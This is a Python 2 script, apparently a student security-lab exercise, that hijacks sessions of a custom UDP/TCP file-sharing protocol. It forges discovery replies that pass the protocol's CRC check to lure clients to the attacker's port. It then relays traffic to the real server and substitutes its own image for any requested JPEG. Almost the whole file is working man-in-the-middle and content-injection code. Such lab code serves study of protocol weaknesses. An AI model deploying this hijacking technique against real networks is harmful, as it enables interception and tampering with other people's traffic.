import socket
import struct
from ctypes import *
import os
import sys

#clean up code (in cyanide as well)
#handle files over the buffer limit?
#implement bonus?
#check protocol : split sends? and 1/0 for Dir/File

#forum questions:
#location of hijack root
#protect ourselvs from dir traversal?
#if a non existant jpg is requested, do we return real jpg?


UDP_IP = "192.168.146.139"
UDP_PORT = 1337
udpSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
udpSock.bind((UDP_IP, UDP_PORT))





tcpSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientTcpSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

header = '\xdea\xaf'
ListFilesReq = 0x01
ListFilesResp = '\xde\xaf\x02'
GetFileReq = 0x03
GetFileResp = '\xde\xaf\x04'

udp_init_start = '\xde\xaf\x01'
mysid = sys.argv[1]
print 'hijacking sid:',mysid
mysid = int(mysid)
myport = 31337
udp_resp_header = '\xde\xaf\x02'

tcpSock.bind((UDP_IP, myport))

base = "."


def SendList(path):
	bp = os.path.join(base,path)
	files = os.listdir(bp)
	header = struct.pack('!3sh',ListFilesResp,len(files))
	data = ''
	for i in files:
		p = os.path.normpath(os.path.join(bp,i))
		size = os.path.getsize(p)
		attr = windll.kernel32.GetFileAttributesA(p)
		if os.path.isdir(p):
			attr = 0x01
		else:
			attr = 0x00
		data += struct.pack('!bih{0}s'.format(len(i)),attr,size,len(i),i)
	return header+data	

#query the real server for its ip and port.	
def udpQuery():
	data = struct.pack('!3si',udp_init_start,mysid)
	clientUdpSock.sendto(data,("255.255.255.255",1337))
	
	data,addr = clientUdpSock.recvfrom(1024)
	format = '!3sihI'
	header,sid,realPort,crc = struct.unpack(format,data)
	
	tmpcrc = (mysid ^ 0xCAFEBABE) + 4 * (realPort ^ 0x652)
	if (tmpcrc != crc) or (header != udp_resp_header):
		print "wat"
		return
	
	print "real addr",addr	
	return (addr[0],realPort)
	
def udpIdentify(data,addr):
	#data, addr = udpSock.recvfrom(1024) # buffer size is 1024 bytes
	
	if not (len(data) == 7):
		return
	bytes,sid = struct.unpack('!3si',data)
	
	
	if not (bytes == udp_init_start) or not (sid == mysid):
		return
	
	format = '!3sihI'
	crc = (sid ^ 0xCAFEBABE) + 4 * (myport ^ 0x652)
	data = struct.pack(format,udp_resp_header,mysid,myport,crc)
	udpSock.sendto(data,addr)
	print "hijacked ",addr 

def SendFile(path):
	p = os.path.join(base,path)
	if not os.path.isfile(p):
		return ''
	size = os.path.getsize(p)
	f = open(p,'rb')
	bytes = f.read()
	f.close()
	fdata = struct.pack('!{0}s'.format(size),bytes)
	data = struct.pack('!i',size)
	#print data
	return GetFileResp+data , fdata

  
while True:
	
	data, addr = udpSock.recvfrom(1024)
	#hijack session
	udpIdentify(data,addr)
	#get real data
	
	clientUdpSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
	clientTcpSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	clientUdpSock.bind((UDP_IP,1338))
	clientUdpSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	clientUdpSock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)	
	rAddr = udpQuery()
	udpSock.recvfrom(1024) #get our own UDP packet out of the stack.
	clientUdpSock.close()
	
	tcpSock.listen(1)
	conn, addr = tcpSock.accept()
	data = conn.recv(1024)
	#validate data
	header ,b, dlen = struct.unpack('!2sbh',data[:5])
	path = struct.unpack('!{0}s'.format(dlen),data[5:])[0]
	if path.endswith('jpg') and b == GetFileReq:
		head,data = SendFile("pic.jpg")
		conn.send(head)
		conn.send(data)
	else:
		#connect to real server
		clientTcpSock.connect(rAddr)
		#send data
		clientTcpSock.send(data)
		#get the real data
		rData = clientTcpSock.recv(1024)
		#send it back.
		sent = conn.send(rData)
		print "got:",len(rData),"sent:",sent
		rData = clientTcpSock.recv(1024*1000*10) #10 MB
		sent = conn.send(rData)		
		print "got:",len(rData),"sent:",sent
	print 'mischief managed'
	
	conn.close()
	clientTcpSock.close()
	
	
	#tcpSock.close() #remove
	
	

